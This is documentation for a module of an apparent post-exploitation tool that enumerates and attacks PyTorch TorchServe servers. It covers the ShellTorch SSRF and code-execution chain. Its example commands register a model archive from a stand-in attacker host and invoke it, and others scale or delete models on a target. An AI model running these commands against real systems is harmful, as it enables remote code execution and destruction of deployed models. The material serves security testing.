# TorchServe

Enumerate and exploit PyTorch TorchServe model serving instances.

## Overview

The `torchserve` module targets TorchServe's separate management, inference, and metrics APIs. The management API (default port 8081) is the primary attack surface, exposing model registration, scaling, and deletion. The `--target` flag points to the management API; use `--inference-url` and `--metrics-url` to override the inference (8080) and metrics (8082) ports.

The `register` subcommand tests the critical ShellTorch SSRF/RCE vector (CVE-2023-43654, CVE-2024-35195) that enables arbitrary code execution via malicious model archive registration.

## Subcommands

### Read-Only (no `--force-exploit` required)

| Subcommand | Description |
|---|---|
| `enum` | List models from management API and check inference health |
| `models` | Detailed model info (handler, runtime, workers, batch size) |
| `metrics` | Prometheus metrics from metrics API |

### Gated (requires `--force-exploit`)

| Subcommand | Description |
|---|---|
| `predict` | Send prediction via inference API |
| `register` | Register model from URL (ShellTorch SSRF/RCE vector) |
| `scale` | Scale model workers (proves management write access) |
| `unregister` | Delete a model (proves destructive access) |

## Flags

| Flag | Required | Description |
|---|---|---|
| `--target` | Yes | Management API URL (default port 8081) |
| `--header` | No | Custom HTTP headers. Repeatable. |
| `--inference-url` | No | Override inference API URL (default: derived from target with port 8080) |
| `--metrics-url` | No | Override metrics API URL (default: derived from target with port 8082) |
| `--model` | For `models`, `predict`, `register`, `scale`, `unregister` | Model name |
| `--payload` | For `predict`; optional for `register` | JSON prediction payload. On `register`, invokes the named model after registration to verify handler execution. |
| `--model-url` | For `register` | URL of model archive (.mar) to register |
| `--initial-workers` | For `register` | Initial workers to request for a named model (default: 1) |
| `--min-workers` | For `scale` | Minimum worker count (default: 1) |

## Key Endpoints

### Management API (port 8081)

| Endpoint | Method | Purpose |
|---|---|---|
| `/models` | GET | List all registered models |
| `/models/<name>` | GET | Detailed model info |
| `/models?url=<url>&model_name=<name>&initial_workers=<n>&synchronous=true` | POST | Register model from URL (SSRF/model-handler vector) |
| `/models/<name>?min_worker=<n>` | PUT | Scale workers |
| `/models/<name>` | DELETE | Unregister model |

### Inference API (port 8080)

| Endpoint | Method | Purpose |
|---|---|---|
| `/ping` | GET | Health check |
| `/<model>/predictions` | POST | Inference request |

### Metrics API (port 8082)

| Endpoint | Method | Purpose |
|---|---|---|
| `/metrics` | GET | Prometheus metrics |

## ShellTorch Vulnerability

The `register` subcommand tests the ShellTorch attack chain:

- **CVE-2023-43654** -- SSRF via model registration URL, allowing requests to internal services and cloud metadata endpoints
- **CVE-2024-35195** -- arbitrary code execution through malicious model archive files

When the management API accepts a registration request from an external URL, it confirms a management-plane write. An out-of-band callback confirms the server fetched the supplied URL. Supplying `--model` and `--payload` asks aipostex to invoke the newly registered model through the inference API; a successful prediction from that model confirms the registered handler path executed.

## What each `landed` level means here

`landed` records what actually landed on the target for each finding. The TorchServe module reaches these levels:

| `landed` | What produces it in torchserve |
|---|---|
| `reachable` | `enum` (service/model listing and health), `models` (model listing and detail), `metrics` (Prometheus data), and any gated write whose request did not succeed. |
| `influenced` | `register` when the management API accepts the registration (HTTP 2xx) but no out-of-band SSRF callback is observed — the write was submitted, but the server fetch is unverified. |
| `execution-confirmed` | `register` when `--callback-url` is set and the target connects back out-of-band (ShellTorch SSRF confirmed), or when `--model` + `--payload` proves the newly registered model can be invoked through inference; `predict` when the inference reality probe confirms input-dependent handler execution; `scale` / `unregister` when the management write actually succeeds. |

This module does not reach `takeover-capable`. The `register` chain is honest about SSRF and handler execution: a bare accepted registration is only `influenced`, `execution-confirmed` requires an observed out-of-band callback or a successful post-registration inference against the named model, and the handler-verification path is reported as `own/execution-confirmed` because the registered model served an invocation. A `predict` whose response does not vary with a mutated input stays at `reachable` rather than over-claiming execution.

## Examples

```bash
# Enumerate models and health
./aipostex torchserve --target http://127.0.0.1:8081 enum

# Detailed model info
./aipostex torchserve --target http://127.0.0.1:8081 models --model resnet

# Extract metrics
./aipostex torchserve --target http://127.0.0.1:8081 metrics

# Test prediction (gated)
./aipostex torchserve --target http://127.0.0.1:8081 predict \
  --model resnet --payload '{"data": "test"}' --force-exploit

# ShellTorch SSRF test (gated)
./aipostex torchserve --target http://127.0.0.1:8081 register \
  --model-url http://attacker.com/test.mar --force-exploit

# Register and verify the named handler executes (gated)
./aipostex torchserve --target http://127.0.0.1:8081 register \
  --model-url http://attacker.com/aipostex.mar \
  --model aipostex-handler --payload '{"data": "test"}' \
  --force-exploit

# Scale workers (gated)
./aipostex torchserve --target http://127.0.0.1:8081 scale \
  --model resnet --min-workers 2 --force-exploit

# Unregister model (gated)
./aipostex torchserve --target http://127.0.0.1:8081 unregister \
  --model resnet --force-exploit
```

## Workflow Progression

```
discover network (discovers TorchServe on :8080/:8081)
  -> torchserve enum (model listing, health)
    -> torchserve models --model <name> (handler, workers)
    -> torchserve metrics (operational data)
    -> torchserve predict --model <name> (inference test, gated)
    -> torchserve register --model-url <url> (ShellTorch SSRF, gated)
    -> torchserve register --model-url <url> --model <name> --payload <json> (handler verification, gated)
```
